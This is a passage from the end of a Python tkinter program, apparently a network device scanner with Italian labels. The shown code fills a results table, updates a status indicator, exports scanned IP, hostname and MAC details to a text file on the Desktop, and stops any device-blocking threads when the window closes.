                             values=(d["ip"], d["hostname"], d["mac"], d["stato"], d["blocco"]),
                             tags=(d["tag"],))
        n = len(devices)
        self.count_lbl.configure(text=f"{n} dispositiv{'o' if n==1 else 'i'} trovati")
        self._set_status("scansione completata", GREEN)

    def _set_status(self, text, color):
        self.status_lbl.configure(text=text, fg=color)
        self.status_dot.configure(fg=color)

    def _export(self):
        if not self.devices:
            messagebox.showinfo("Nessun dato", "Esegui prima una scansione.")
            return
        path = os.path.join(os.path.expanduser("~"), "Desktop", "wifi_scan.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"WiFi Scanner — {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
            for d in self.devices:
                f.write(f"IP:       {d['ip']}\n")
                f.write(f"Hostname: {d['hostname']}\n")
                f.write(f"MAC:      {d['mac']}\n")
                f.write(f"Stato:    {d['stato']}\n")
                f.write("-" * 40 + "\n")
        messagebox.showinfo("Esportato", f"File salvato in:\n{path}")

    def on_close(self):
        for data in blocked_threads.values():
            data["stop"].set()
        self.destroy()

if __name__ == "__main__":
    app = WifiScanner()
    app.protocol("WM_DELETE_WINDOW", app.on_close)
    app.mainloop()